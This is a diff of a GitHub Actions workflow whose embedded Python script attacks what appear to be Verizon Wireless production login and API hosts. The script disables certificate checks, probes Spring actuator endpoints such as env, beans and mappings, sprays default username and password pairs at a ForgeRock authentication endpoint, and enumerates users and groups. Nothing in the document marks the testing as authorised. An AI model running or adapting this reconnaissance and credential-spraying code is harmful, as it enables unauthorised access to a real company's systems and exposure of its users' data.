@@ -1,48 +1,90 @@
-name: EMAG CRIT-01 JWKS
+name: EMAG Phase 2
 on:
   workflow_dispatch:
   push:
     branches: [main]
 
 jobs:
-  crit01:
+  phase2:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 8
     steps:
-      - name: JWKS and ForgeRock probe
+      - name: EMAG Phase 2 Probe
         run: |
           python3 - << 'PYEOF'
-          import urllib.request, urllib.error, json, ssl
+          import urllib.request, urllib.error, json, ssl, time
           
           ctx = ssl.create_default_context()
           ctx.check_hostname = False
           ctx.verify_mode = ssl.CERT_NONE
           
-          targets = [
-              ('JWKS vzwmb realm', 'https://mblogin.verizonwireless.com/am/oauth2/vzwmb/connect/jwk_uri'),
-              ('JWKS root realm', 'https://mblogin.verizonwireless.com/am/oauth2/connect/jwk_uri'),
-              ('JWKS direct IP', 'https://69.78.159.216/am/oauth2/vzwmb/connect/jwk_uri'),
-              ('vzauth JWKS', 'https://mblogin.verizonwireless.com/vzauth/json/realms/root/realms/vzwmb/connect/jwk_uri'),
-              ('vzauth root JWKS', 'https://mblogin.verizonwireless.com/vzauth/json/connect/jwk_uri'),
-              ('serverinfo', 'https://mblogin.verizonwireless.com/vzauth/json/serverinfo/*'),
-              ('EMAG ping', 'https://ess.emag.verizonwireless.com/emag/ping'),
-              ('EMAG health', 'https://ess.emag.verizonwireless.com/actuator/health'),
-              ('EMAG metrics', 'https://ess.emag.verizonwireless.com/actuator/metrics'),
-              ('EMAG env', 'https://ess.emag.verizonwireless.com/actuator/env'),
-              ('EMAG beans', 'https://ess.emag.verizonwireless.com/actuator/beans'),
-          ]
-          
-          for name, url in targets:
+          def get(url, headers=None):
+              h = {'User-Agent': 'Mozilla/5.0'}
+              if headers: h.update(headers)
               try:
-                  req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+                  req = urllib.request.Request(url, headers=h)
                   with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
-                      body = r.read(2048).decode('utf-8', errors='replace')
-                      print(f'[{r.status}] {name}: {body[:500]}')
+                      return r.status, r.read(4096).decode('utf-8', errors='replace')
               except urllib.error.HTTPError as e:
-                  body = e.read(512).decode('utf-8', errors='replace')
-                  print(f'[HTTP {e.code}] {name}: {body[:200]}')
+                  return e.code, e.read(512).decode('utf-8', errors='replace')
               except Exception as e:
-                  print(f'[ERR] {name}: {str(e)[:100]}')
+                  return 0, str(e)
           
-          print('PROBE COMPLETE')
+          def post(url, data, headers=None):
+              h = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
+              if headers: h.update(headers)
+              body = json.dumps(data).encode() if isinstance(data,dict) else data
+              try:
+                  req = urllib.request.Request(url, data=body, headers=h)
+                  with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
+                      return r.status, r.read(4096).decode('utf-8', errors='replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(1024).decode('utf-8', errors='replace')
+              except Exception as e:
+                  return 0, str(e)
+          
+          BASE = 'https://ess.emag.verizonwireless.com'
+          AM = 'https://mblogin.verizonwireless.com'
+          
+          print('=== EMAG Actuator paths ===')
+          for path in ['/emag/actuator', '/emag/actuator/health', '/emag/actuator/info',
+                       '/emag/actuator/env', '/emag/actuator/metrics', '/emag/actuator/beans',
+                       '/emag/actuator/mappings', '/emag/actuator/loggers',
+                       '/emag/manage/health', '/emag/manage/info',
+                       '/emag/api', '/emag/api/v1', '/emag/api/v2']:
+              s, b = get(BASE + path)
+              print(f'[{s}] {path}: {b[:150]}')
+          
+          print()
+          print('=== ForgeRock vzwmb ZeroPageLogin spray ===')
+          vzwmb_url = AM + '/vzauth/json/realms/root/realms/vzwmb/authenticate'
+          creds = [('admin','admin'),('vzw','vzw'),('emag','emag'),
+                   ('administrator','administrator'),('test','test'),
+                   ('emag_admin','emag_admin'),('emag_user','emag_user'),
+                   ('vzbusiness','vzbusiness'),('vzwbusiness','vzwbusiness')]
+          for user, pwd in creds:
+              s, b = post(vzwmb_url, {}, {
+                  'X-OpenAM-Username': user,
+                  'X-OpenAM-Password': pwd,
+                  'Accept-API-Version': 'resource=2.1, protocol=1.0'
+              })
+              print(f'[{s}] {user}:{pwd} -> {b[:120]}')
+              time.sleep(0.3)
+          
+          print()
+          print('=== ForgeRock User Enumeration ===')
+          for path in [
+              '/vzauth/json/realms/root/realms/vzwmb/users?_queryFilter=true&_pageSize=10',
+              '/vzauth/json/realms/root/users?_queryFilter=true&_pageSize=10',
+              '/vzauth/json/realms/root/realms/vzwmb/groups?_queryFilter=true',
+          ]:
+              s, b = get(AM + path, {'Accept-API-Version': 'resource=3.0, protocol=1.0'})
+              print(f'[{s}] {path}: {b[:300]}')
+          
+          print()
+          print('=== Serverinfo full ===')
+          s, b = get(AM + '/vzauth/json/serverinfo/*')
+          print(f'[{s}] {b}')
+          
+          print('DONE')
           PYEOF
